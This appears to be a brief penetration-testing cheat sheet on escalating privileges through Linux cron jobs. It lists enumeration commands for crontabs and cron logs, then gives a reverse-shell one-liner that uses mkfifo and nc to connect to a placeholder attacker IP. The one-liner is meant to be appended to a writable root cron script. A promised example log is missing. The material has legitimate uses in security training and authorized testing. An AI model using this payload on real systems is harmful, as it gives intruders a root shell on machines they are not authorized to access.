On a Linux system, the cron time-based job scheduler is a prime target, since system-level scheduled jobs are executed with root user privileges and system administrators often create scripts for cron jobs with insecure permissions.
# Enumeration
```bash
crontab -l
```
```bash
sudo crontab -l
```
```bash
cat /etc/crontab
```
```bash
ls -lah /etc/cron*
```
Look for cron specific logs:
```bash
ls /var/log
```
```bash
grep "CRON" /var/log/syslog
```
Example vulnerable log showing root running a script in a user writeable directory:

## Inspect Content/Permissions of cron job
```bash
ls -lah /home/joe/.scripts/user_backups.sh
```
```bash
cat /home/joe/.scripts/user_backups.sh
```
### Revshell Oneliner
If the cronjob can be overwritten:
```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $(ATTACKER IP) $(PORT) >/tmp/f" >> $(CRONJOB_FILE)
```
